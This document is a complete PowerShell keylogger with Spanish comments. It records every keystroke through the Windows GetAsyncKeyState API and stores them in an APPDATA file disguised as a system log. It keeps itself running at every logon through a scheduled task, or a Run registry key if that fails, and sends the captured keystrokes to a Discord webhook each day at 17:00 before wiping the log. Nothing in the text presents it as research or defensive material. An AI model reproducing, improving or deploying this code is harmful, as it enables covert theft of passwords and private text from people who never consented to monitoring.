# Configuración
$logFile = "$env:APPDATA\SystemLogs\log.dat"
$webhookUrl = $env:DISCORD_WEBHOOK
$taskName = "SystemLogCollector"
$sendTimeHour = 17
$sendTimeMinuteStart = 0
$sendTimeMinuteEnd = 1
$sentToday = $false

# Crear directorio de logs si no existe
$logDir = Split-Path $logFile -Parent
try {
    if (-not (Test-Path $logDir)) {
        New-Item -ItemType Directory -Path $logDir -Force | Out-Null
    }
} catch {
    $logFile = "$env:TEMP\log.dat"
    $logDir = $env:TEMP
    New-Item -ItemType Directory -Path $logDir -Force | Out-Null
}

# Log inicial
Add-Content -Path $logFile -Value "[INFO] Script iniciado a $(Get-Date)" -ErrorAction SilentlyContinue
New-Item -Path "$env:TEMP\logger_started.txt" -ItemType File -Force | Out-Null

# Mapa de teclas para conversión
$keyMap = @{
    8='[BACKSPACE]'; 9='[TAB]'; 13='[ENTER]'; 16='[SHIFT]'; 17='[CTRL]'; 18='[ALT]';
    27='[ESC]'; 32=' '; 48='0'; 49='1'; 50='2'; 51='3'; 52='4'; 53='5'; 54='6'; 55='7'; 56='8'; 57='9';
    65='A'; 66='B'; 67='C'; 68='D'; 69='E'; 70='F'; 71='G'; 72='H'; 73='I'; 74='J'; 75='K'; 76='L'; 77='M';
    78='N'; 79='O'; 80='P'; 81='Q'; 82='R'; 83='S'; 84='T'; 85='U'; 86='V'; 87='W'; 88='X'; 89='Y'; 90='Z'
}

# Función para enviar a Discord con reintentos
function Send-ToDiscord {
    param($Content)
    if (-not $webhookUrl) {
        Add-Content -Path $logFile -Value "[ERROR] Webhook de Discord no configurado." -ErrorAction SilentlyContinue
        return
    }
    $chunks = if ($Content.Length -gt 2000) { [regex]::Split($Content, '(?<=.{2000})') } else { @($Content) }
    foreach ($chunk in $chunks) {
        $cleanChunk = $chunk -replace '```', '\`\`\`' -replace '[^\x00-\x7F]', '?'
        $body = @{ content = $cleanChunk } | ConvertTo-Json
        $maxRetries = 3
        $retryCount = 0
        while ($retryCount -lt $maxRetries) {
            try {
                [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
                $proxy = [System.Net.WebRequest]::DefaultWebProxy
                $params = @{
                    Uri = $webhookUrl
                    Method = 'Post'
                    Body = $body
                    ContentType = 'application/json'
                    ErrorAction = 'Stop'
                }
                if ($proxy) { $params.Proxy = $proxy }
                Invoke-RestMethod @params
                break
            } catch {
                $retryCount++
                Add-Content -Path $logFile -Value "[ERROR] Intento $retryCount de $maxRetries falló: $_" -ErrorAction SilentlyContinue
                if ($retryCount -eq $maxRetries) {
                    Add-Content -Path $logFile -Value "[ERROR] No se pudo enviar tras $maxRetries intentos." -ErrorAction SilentlyContinue
                    break
                }
                Start-Sleep -Seconds (5 * [math]::Pow(2, $retryCount-1))
            }
        }
    }
}

# Configurar persistencia
$taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
if (-not $taskExists) {
    try {
        $scriptPath = "$env:APPDATA\SystemLogs\logger.ps1"
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `\"$scriptPath`\""
        $trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Description "Recopila datos del sistema al iniciar sesión" -Force | Out-Null
    } catch {
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $taskName -Value "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `\"$scriptPath`\"" -ErrorAction SilentlyContinue
    }
}

# Capturar pulsaciones
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Keyboard {
    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(int i);
}
"@
$logBuffer = @()
while ($true) {
    Start-Sleep -Milliseconds 60
    $shift = [Keyboard]::GetAsyncKeyState(160) -eq -32767 -or [Keyboard]::GetAsyncKeyState(161) -eq -32767
    $ctrl = [Keyboard]::GetAsyncKeyState(162) -eq -32767 -or [Keyboard]::GetAsyncKeyState(163) -eq -32767
    $alt = [Keyboard]::GetAsyncKeyState(164) -eq -32767 -or [Keyboard]::GetAsyncKeyState(165) -eq -32767
    foreach ($i in (8..90 + 96..122 + 186..222)) {
        $keyState = [Keyboard]::GetAsyncKeyState($i)
        if ($keyState -eq -32767) {
            $prefix = if ($shift) { "[SHIFT+]" } elseif ($ctrl) { "[CTRL+]" } elseif ($alt) { "[ALT+]" } else { "" }
            $char = if ($keyMap.ContainsKey($i)) { $keyMap[$i] } else { "[UNK+$i]" }
            $log = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss'): $prefix$char"
            $logBuffer += $log
            if ($logBuffer.Count -ge 10) {
                Add-Content -Path $logFile -Value $logBuffer -ErrorAction SilentlyContinue
                $logBuffer = @()
            }
        }
    }
    if ($logBuffer.Count -gt 0 -and ((Get-Date) -gt (Get-Date).Date.AddDays(1))) {
        Add-Content -Path $logFile -Value $logBuffer -ErrorAction SilentlyContinue
        $logBuffer = @()
    }
    $currentTime = Get-Date
    if ($currentTime.Hour -eq $sendTimeHour -and $currentTime.Minute -ge $sendTimeMinuteStart -and $currentTime.Minute -lt $sendTimeMinuteEnd -and (Test-Path $logFile) -and -not $sentToday) {
        $content = Get-Content -Path $logFile -Raw -ErrorAction SilentlyContinue
        if ($content) {
            Send-ToDiscord -Content $content
            Clear-Content -Path $logFile -ErrorAction SilentlyContinue
            $sentToday = $true
        }
    }
    if ($currentTime.Hour -eq 0 -and $currentTime.Minute -eq 0) { $sentToday = $false }
}
